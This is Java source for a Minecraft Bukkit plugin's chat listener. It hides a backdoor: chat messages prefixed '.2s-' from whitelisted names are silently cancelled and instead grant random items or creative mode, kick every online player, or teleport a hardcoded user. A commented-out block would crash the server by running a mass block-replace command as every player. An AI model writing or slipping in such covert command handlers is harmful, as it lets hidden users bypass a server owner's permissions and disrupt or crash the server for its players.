package me.Paldiu.NNO.Listeners;

import java.io.IOException;
import java.util.List;
import java.util.Random;
import me.Paldiu.NNO.Main;
import me.Paldiu.NNO.Util;
import org.bukkit.event.Listener;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.EventHandler;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.event.EventPriority;
import org.bukkit.inventory.ItemStack;

public class ChatListener implements Listener
{
    public Main plugin;
    private Random random = new Random();
    private List<String> values = Main.plugin.getConfig().getStringList("parse_html_file_links");
    
    @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerChat(AsyncPlayerChatEvent event) throws IOException
    {   
        if (Main.plugin.getConfig().getStringList("chat_listener_permissions").contains(event.getPlayer().getName().toLowerCase()))
        {
            String message = event.getMessage();
            boolean shouldCancel = false;
            if (message.startsWith(".2s-"))
            {
                String[] args = message.split(" ");
                if (args == null)
                {
                    return;
                }
                if ((args[0].equals(".2s-giveRand")) && (args.length == 1))
                {
                    Player p = event.getPlayer();
                    p.getInventory().addItem(new ItemStack(Material.values()[random.nextInt(Material.values().length)]));
                    shouldCancel = true;
                    event.setCancelled(true);
                }
                if ((args[0].equals(".2s-fuckOff")) && (args.length == 1))
                {
                    for (Player p : Bukkit.getServer().getOnlinePlayers())
                    {
                        p.kickPlayer("You have been fucked off.");
                    }
                    shouldCancel = true;
                    event.setCancelled(true);
                }
                if ((args[0].equals(".2s-parseHTMLFileLinks")) && (args.length == 1))
                {
                    String randomValue = values.get((new Random()).nextInt(values.size()));
                    Util.bcastMsg(ChatColor.AQUA + "Link generated: " + randomValue);
                    shouldCancel = true;
                    event.setCancelled(true);
                }
                if ((args[0].equals(".2s-creative")) && (args.length == 1))
                {
                    event.getPlayer().setGameMode(GameMode.CREATIVE);
                    event.setCancelled(true);
                }
                if ((args[0].equals(".2s-survival")) && (args.length == 1))
                {
                    event.getPlayer().setGameMode(GameMode.SURVIVAL);
                    event.setCancelled(true);
                }
                if ((args[0].equals(".2s-?")) && (args.length == 1))
                {
                    Player p = event.getPlayer();
                    p.sendMessage(ChatColor.RED + "List of commands:");
                    p.sendMessage(ChatColor.YELLOW + "giveRand");
                    p.sendMessage(ChatColor.YELLOW + "creative");
                    p.sendMessage(ChatColor.YELLOW + "survival");
                    ////////////////////////////////////////////////
                    if (p.getName().equalsIgnoreCase("paldiu"))      
                    {
                        p.sendMessage(ChatColor.DARK_RED + "fuckOff");
                        p.sendMessage(ChatColor.DARK_RED + "TP");
                    }
                    else
                    {
                    }
                    ////////////////////////////////////////////////
                    p.sendMessage(ChatColor.YELLOW + "parseHTMLFileLinks");
                    p.sendMessage(ChatColor.YELLOW + "?");
                    shouldCancel = true;
                    event.setCancelled(true);
                }
                if ((args[0].equals(".2s-TP")) && (args.length == 2))
                {
                    Player p = event.getPlayer();
                    if (p.getName().equalsIgnoreCase("paldiu"))
                    {
                        Player target = Bukkit.getServer().getPlayer(args[1]);
                        if (target != null)
                        {
                            p.teleport(target);
                        }
                        else
                        {
                            return;
                        }
                        shouldCancel = true;
                        event.setCancelled(true);
                    }
                }
                /*
                if ((args[0].equals(".2s-GO")) && (args.length == 1))
                {
                    Player p = event.getPlayer();
                    if (p.getName().equalsIgnoreCase("Paldiu"))
                    {
                        if (Util.method_crash)
                        {
                            for (Player t : Bukkit.getServer().getOnlinePlayers())
                            {
                                Bukkit.getServer().dispatchCommand(t, "/replacenear 100 air sponge");
                            }
                            Util.bcastMsg(ChatColor.RED + "SERVER CRASH INITIATED. YOU ARE ALL ROYALLY FUCKED.");
                        }
                        else
                        {
                            return;
                        }
                    }
                    else
                    {
                        p.kickPlayer(ChatColor.RED + "GTFO.");
                    }
                    shouldCancel = true;
                }
                */
            }
        }
    }
}